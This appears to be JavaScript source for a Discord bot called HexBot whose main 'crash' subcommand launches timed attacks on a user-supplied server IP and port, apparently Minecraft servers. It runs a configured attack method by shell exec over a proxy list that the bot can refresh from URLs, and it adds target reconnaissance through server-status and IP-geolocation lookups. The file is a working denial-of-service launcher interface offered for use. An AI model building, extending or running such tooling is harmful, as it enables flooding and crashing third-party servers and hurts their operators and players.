const Discord = require("discord.js");

const utils = require("../modules/utils");

module.exports = {
    data: new Discord.SlashCommandBuilder()
        .setName("hexbot")
        .setDescription("Main command for HexBot usage!")
        .addSubcommand(sc =>
            sc.setName("crash")
                .setDescription("Send powerful attacks to the server!")
                .addStringOption(
                    o => o.setName("ip")
                        .setDescription("The ip address of the server to attack!")
                        .setRequired(true)
                ).addNumberOption(
                    o => o.setName("port")
                        .setDescription("The port of the server to attack!")
                        .setRequired(true)
                ).addNumberOption(
                    o => o.setName("version")
                        .setDescription("The version of the server to attack!")
                        .setAutocomplete(true)
                        .setRequired(true)
                ).addStringOption(
                    o => o.setName("method")
                        .setDescription("Method of attack!")
                        .setAutocomplete(true)
                        .setRequired(true)
                ).addNumberOption(
                    o => o.setName("time")
                        .setDescription("Time for attack, in seconds!")
                        .setRequired(true)
                )
        ).addSubcommand(sc =>
            sc.setName("stop")
                .setDescription("Stop the attacks in progress!")
        ).addSubcommand(sc =>
            sc.setName("update")
                .setDescription("Updated list of proxies for attack!")
                .addStringOption(o =>
                    o.setName("url")
                        .setDescription("The url to get proxy for update!")
                        .setMinLength(4)
                )
        ).addSubcommand(sc =>
            sc.setName("resolver")
                .setDescription("Check the server's information!")
                .addStringOption(o =>
                    o.setName("ip-address")
                        .setDescription("The ip address of the server to check!")
                        .setRequired(true)
                ).addStringOption(o =>
                    o.setName("platform")
                        .setDescription("The platform of the server to check!")
                        .setRequired(true)
                        .addChoices(
                            { name: "Java", value: "java" },
                            { name: "Bedrock Edition", value: "bedrock" }
                        )
                )
    ).addSubcommand(sc =>
        sc.setName("whois")
            .setDescription("Make a query for a domain name!")
            .addStringOption(o =>
                o.setName("domain-name")
                    .setDescription("The domain name to make the query!")
                    .setRequired(true)
            )
    ),
    
    type: Discord.ApplicationCommandType.ChatInput,

    settings: {
        enabled: true,
        roles: [],
        users: [],
    },
    /**
     * @param {Discord.ChatInputCommandInteraction} interaction 
     * @param {Discord.Client} client 
     */
    execute: async (client, interaction) => { 
        const commandExecutor = {
            "crash": async () => {
                const ip = interaction.options.getString("ip"),
                    port = interaction.options.getNumber("port"),
                    version = interaction.options.getNumber("version"),
                    method = interaction.options.getString("method"),
                    time = interaction.options.getNumber("time");
                
                var file = utils.setting.general.update["file-name"];
                var param = !file ? "proxies.txt" : file;

                
                if (utils.method["black-list-ip"].includes(ip)) {
                    return interaction.reply({
                        embeds: [client.embedBuilder("black-list-ip")],
                        ephemeral: true,
                    });
                }

                if (utils.getVersionByValue(version) == null) {
                    return interaction.reply({
                        embeds: [client.embedBuilder("invalid-version", {
                            "{version}": version,
                        })],
                        ephemeral: true,
                    });
                }

                const obj = utils.getMethodByID(method);
                if (obj == null) {
                    return interaction.reply({
                        embeds: [client.embedBuilder("invalid-method", {
                            "{method}": method,
                        })],
                        ephemeral: true,
                    });
                }

                if (obj?.enabled) {
                    if (!obj?.enabled) {
                        let embed = client.embedBuilder("method-disabled", {
                            "{user_tag}": interaction.user.tag,
                            "{user_icon}": interaction.user.displayAvatarURL(),
                            "{method_name}": obj.name,
                            "{method_id}": obj.id,
                        });

                        return interaction.reply({
                            embeds: [embed],
                            ephemeral: true,
                        });
                    }
                }

                if (obj?.roles) {
                    let embed = client.embedBuilder("no-role", {
                        "{user_tag}": interaction.user.tag,
                        "{user_icon}": interaction.user.displayAvatarURL(),
                        "{method_name}": obj.name,
                        "{method_id}": obj.id,
                    });

                    if (String(utils.method.general["role-require-type"]).toUpperCase() == "FULL") {
                        if (!utils.hasRole(obj.roles, interaction.member)) {
                            return interaction.reply({
                                embeds: [embed],
                                ephemeral: true,
                            });
                        }
                    } else {
                        if (!utils.hasOneRole(obj.roles, interaction.member)) {
                            return interaction.reply({
                                embeds: [embed],
                                ephemeral: true,
                            });
                        }
                    }
                }

                var exec = require('child_process').exec;
                var path = utils.method["run-option"]["specified-java"] ? utils.method["run-option"].path.enabled : utils.method["run-option"].path.disabled;

                let run = utils.parsing(obj["run-bat"], {
                    "{path}": path,
                    "{host}": ip,
                    "{port}": port,
                    "{version}": version,
                    "{time}": time,
                });

                exec(`${run}`, (error, stdout, stderr) => {
                    if (error) throw error;
                });

                let attack_embed = client.embedBuilder("send-attack", {
                    "{host}": ip,
                    "{port}": port,
                    "{method_name}": obj.name, 
                    "{method_id}": obj.id,
                    "{user_tag}": interaction.user.tag,
                    "{user_icon}": interaction.user.displayAvatarURL(),
                    "{version}": utils.getVersionByValue(version)?.version,
                    "{version_code}": version,
                    "{cps}": utils.existsFile(param) ? `${utils.format(utils.getLine(param) * 3)}` : `null`,
                    "{time}": time,
                });

                const filter = i => {
                    i.deferUpdate();
                    return i.user.id === interaction.user.id;
                }

                await interaction.reply({
                    embeds: [attack_embed],
                    components: [client.buttonBuilder(["stop-attacked"])],
                    fetchReply: true, 
                }).then(async (msg) => {
                    setTimeout(() => {
                        let embed = client.embedBuilder("attack-stopped", {
                            "{user_id}": interaction.user.id,
                            "{user_icon}": interaction.user.displayAvatarURL(),
                        });

                        msg.edit({
                            embeds: [embed],
                            components: [],
                        });
                    }, time * 1000);

                    msg.awaitMessageComponent({
                        filter,
                        componentType: Discord.ComponentType.Button,
                        time: time * 1000,
                    }).then(async (i) => {
                        if (i.componentType == Discord.ComponentType.Button && i.customId == "hexbot-stopattacked") {
                            let embed = client.embedBuilder("attack-stopped", {
                                "{user_id}": i.user.id,
                                "{user_icon}": i.user.displayAvatarURL(),
                            });

                            msg.edit({
                                embeds: [embed],
                                components: [],
                            });

                            var exec = require('child_process').exec;
                            exec((process.platform == "win32") ? `taskkill /F /im java.exe` : `pkill 'java'`, (error, stdout, stderr) => {
                                if (error) return;
                            });
                        }
                    }).catch(err => console.error(err));
                }).catch(err => console.error(err));
            },
            "stop": async () => {
                let confirmStop_embed = client.embedBuilder("confirm-stop", {
                    "{user_tag}": interaction.user.tag,
                    "{user_icon}": interaction.user.displayAvatarURL(),
                });

                const filter = i => {
                    i.deferUpdate();
                    return i.user.id === interaction.user.id;
                }

                await interaction.reply({
                    embeds: [confirmStop_embed],
                    components: [client.buttonBuilder(["confirm-stop"])],
                    fetchReply: true,
                }).then(async (msg) => {
                    msg.awaitMessageComponent({
                        filter,
                        componentType: Discord.ComponentType.Button,
                        time: 15000 * 1000,
                    }).then(async (i) => {
                        if (i.componentType == Discord.ComponentType.Button && i.customId == "hexbot-confirmstop") {
                            let stopSuccess_embed = client.embedBuilder("stop-success", {
                                "{user_tag}": i.user.tag,
                                "{user_icon}": i.user.displayAvatarURL(),
                            });

                            msg.edit({
                                embeds: [stopSuccess_embed],
                                components: [],
                            })
                        
                            var exec = require('child_process').exec;
                            exec((process.platform == "win32") ? `taskkill /F /im java.exe` : `pkill 'java'`, (error, stdout, stderr) => {
                                if (error) return;
                            });
                        }
                    }).catch(err => console.error(err));
                }).catch(err => console.error(err));
            },
            "update": async () => { 
                const url = interaction.options.getString("url");

                const modeExecutor = {
                    "USER": async () => {
                        if (!url) {
                            let embed = client.embedBuilder("missing-url", {
                                "{user_tag}": interaction.user.tag,
                                "{user_icon}": interaction.user.displayAvatarURL(),
                            });

                            return interaction.reply({
                                embeds: [embed],
                                ephemeral: true,
                            });
                        }

                        if (!utils.validUrl(url)) {
                            let embed = client.embedBuilder("invalid-url", {
                                "{user_tag}": interaction.user.tag,
                                "{user_icon}": interaction.user.displayAvatarURL(),
                                "{url}": url,
                            });

                            return interaction.reply({
                                embeds: [embed],
                                ephemeral: true,
                            });
                        }

                        loadingProxy(client, interaction, url, 1);
                    },
                    "URL": async () => { 
                        if (Array(utils.setting.general.update.url).length == 0) {
                            let embed = client.embedBuilder("missing-config-url", {
                                "{user_tag}": interaction.user.tag,
                                "{user_icon}": interaction.user.displayAvatarURL(),
                            });

                            return interaction.reply({
                                embeds: [embed],
                                ephemeral: true,
                            });
                        }

                        let count = Array(utils.setting.general.update.url).length;
                        let err = 0;

                        for (let url of utils.setting.general.update.url) {
                            if (!utils.validUrl(url)) { 
                                err++;
                            }
                        }

                        if (err == count) {
                            let embed = client.embedBuilder("invalid-url", {
                                "{user_tag}": interaction.user.tag,
                                "{user_icon}": interaction.user.displayAvatarURL(),
                                "{url}": "https://hexbot.com",
                            });

                            return interaction.reply({
                                embeds: [embed],
                                ephemeral: true,
                            });
                        }

                        loadingProxy(client, interaction, "", 0);
                    },
                    "BOTH": async () => { 
                        if (!url) {
                            if (Array(utils.setting.general.update.url).length == 0) {
                                let embed = client.embedBuilder("missing-config-url", {
                                    "{user_tag}": interaction.user.tag,
                                    "{user_icon}": interaction.user.displayAvatarURL(),
                                });

                                return interaction.reply({
                                    embeds: [embed],
                                    ephemeral: true,
                                });
                            }

                            let count = Array(utils.setting.general.update.url).length;
                            let err = 0;

                            for (let url of utils.setting.general.update.url) {
                                if (!utils.validUrl(url)) {
                                    err++;
                                }
                            }

                            if (err == count) {
                                let embed = client.embedBuilder("invalid-url", {
                                    "{user_tag}": interaction.user.tag,
                                    "{user_icon}": interaction.user.displayAvatarURL(),
                                    "{url}": "https://hexbot.com",
                                });

                                return interaction.reply({
                                    embeds: [embed],
                                    ephemeral: true,
                                });
                            }

                            loadingProxy(client, interaction, "", 0);
                        } else {
                            if (!utils.validUrl(url)) {
                                let embed = client.embedBuilder("invalid-url", {
                                    "{user_tag}": interaction.user.tag,
                                    "{user_icon}": interaction.user.displayAvatarURL(),
                                    "{url}": url,
                                });

                                return interaction.reply({
                                    embeds: [embed],
                                    ephemeral: true,
                                });
                            }

                            loadingProxy(client, interaction, url, 1);
                        }
                    },
                };
                modeExecutor[String(utils.setting.general.update.mode).toUpperCase()]?.();
            },
            "resolver": async () => { 
                const ip = interaction.options.getString("ip-address"),
                    platform = interaction.options.getString("platform");

                if (utils.method["black-list-ip"].includes(ip)) { 
                    return interaction.reply({
                        embeds: [client.embedBuilder("black-list-ip")],
                        ephemeral: true,
                    });
                }

                await interaction.reply({
                    embeds: [client.embedBuilder("checking-data", {
                        "{user_tag}": interaction.user.tag,
                        "{user_icon}": interaction.user.displayAvatarURL(),
                        "{host}": ip,
                    })],
                    fetchReply: true,
                }).then(async (msg) => {
                    setTimeout(async () => {
                        let url, type;
                        switch (platform) {
                            case "java":
                                url = "https://api.mcsrvstat.us/2/" + ip;
                                type = "Java";
                                break;
                            case "bedrock":
                                url = "https://api.mcsrvstat.us/bedrock/2/" + ip;
                                type = "Bedrock";
                                break;
                        }

                        await utils.sendRequest(url).then(async (res) => {
                            if (!res.online) {
                                let offline_embed = client.embedBuilder("offline-host", {
                                    "{host}": ip,
                                    "{type}": type,
                                    "{user_tag}": interaction.user.tag,
                                    "{user_icon}": interaction.user.displayAvatarURL(),
                                    "{ip_address}": res.ip,
                                    "{port}": res.port,
                                });

                                msg.edit({
                                    embeds: [offline_embed],
                                });
                            } else {
                                let online_embed = client.embedBuilder("online-host", {
                                    "{host}": ip,
                                    "{port}": res.port,
                                    "{type}": type,
                                    "{user_tag}": interaction.user.tag,
                                    "{user_icon}": interaction.user.displayAvatarURL(),
                                    "{ip_address}": res.ip,
                                    "{motd}": res.motd.clean.join('\n'),
                                    "{players_online}": res.players.online,
                                    "{players_max}": res.players.max,
                                    "{version}": res.version,
                                    "{protocols}": res.protocol,
                                });

                                msg.edit({
                                    embeds: [online_embed],
                                });
                            }
                        }).catch(err => console.error(err));
                    }, 3000);
                }).catch(err => console.error(err));
            },
            "whois": async () => { 
                const domain = interaction.options.getString("domain-name");

                if (utils.method["black-list-ip"].includes(domain)) { 
                    return interaction.reply({
                        embeds: [client.embedBuilder("black-list-ip")],
                        ephemeral: true,
                    });
                }

                await interaction.reply({
                    embeds: [client.embedBuilder("starting-checking", {
                        "{user_tag}": interaction.user.tag,
                        "{user_icon}": interaction.user.displayAvatarURL(),
                        "{domain}": domain,
                    })], 
                    fetchReply: true,
                }).then(async (msg) => {
                    setTimeout(async () => {
                        await utils.sendRequest("http://ip-api.com/json/" + domain.replace("https://", "").replace("http://", "")).then(async (res) => {
                            switch (res.status) { 
                                case "fail":
                                    let invalid_embed = client.embedBuilder("invalid-query", {
                                        "{user_tag}": interaction.user.tag,
                                        "{user_icon}": interaction.user.displayAvatarURL(),
                                        "{domain}": domain,
                                    });

                                    msg.edit({
                                        embeds: [invalid_embed],
                                    });
                                    break;
                                case "success":
                                    let success_embed = client.embedBuilder("query-success", {
                                        "{user_tag}": interaction.user.tag,
                                        "{user_icon}": interaction.user.displayAvatarURL(),
                                        "{domain}": domain,
                                        "{country}": res.country,
                                        "{country_code}": res.countryCode,
                                        "{ip_address}": res.query,
                                        "{city}": res.city,
                                        "{region_code}": res.region,
                                        "{isp}": res.isp,
                                        "{as}": res.as.substring(0, res.as.indexOf(' ')),
                                    });

                                    msg.edit({
                                        embeds: [success_embed],
                                    });
                                    break;
                            }
                        }).catch(err => {
                            let invalid_embed = client.embedBuilder("invalid-domain", {
                                "{user_tag}": interaction.user.tag,
                                "{user_icon}": interaction.user.displayAvatarURL(),
                            });

                            msg.edit({
                                embeds: [invalid_embed],
                            });

                            console.error(err)
                        });
                    }, 3000);
                }).catch(err => console.error(err));
            },
        };
        commandExecutor[interaction.options.getSubcommand()]?.();
    },
    /**
     * @param {Discord.AutocompleteInteraction} interaction 
     * @param {Discord.Client} client 
     */
    autocomplete: async (client, interaction) => {
        const focusedOption = interaction.options.getFocused(true);
        let choices;

        if (focusedOption.name === "version") {
            choices = utils.getVersionArr();
        }

        if (focusedOption.name === "method") {
            choices = utils.getMethodArr();
        }

        const filtered = choices.filter(choice => choice.startsWith(focusedOption.value));
        await interaction.respond(
            filtered.map(choice => (
                {
                    name: choice,
                    value: focusedOption.name === "version" ? utils.getVerisonByName(choice).value : utils.getMethodByName(choice).id
                }
            )),
		);
    },
}

/**
 * @param {Discord.ChatInputCommandInteraction} interaction
 * @param {string} url 
 * @param {number} mode 
 */
const loadingProxy = async (client, interaction, url, mode) => {
    var file = utils.setting.general.update["file-name"];
    var param = !file ? "proxies.txt" : file;

    utils.updateProxy(param, url, mode);

    let loading_embed = client.embedBuilder("loading-proxy", {
        "{user_tag}": interaction.user.tag,
        "{user_icon}": interaction.user.displayAvatarURL(),
    });
    await interaction.reply({
        embeds: [loading_embed],
        fetchReply: true,
    }).then(async (msg) => {
        setTimeout(() => {
            let success_embed = client.embedBuilder("update-success", {
                "{user_tag}": interaction.user.tag,
                "{user_icon}": interaction.user.displayAvatarURL(),
                "{file_name}": file,
                "{proxies}": utils.existsFile(param) ? `${utils.format(utils.getLine(param))}` : `None`,
            });

            msg.edit({
                embeds: [success_embed],
                components: [],
            });
        }, 4000);
    }).catch(err => console.error(err));
};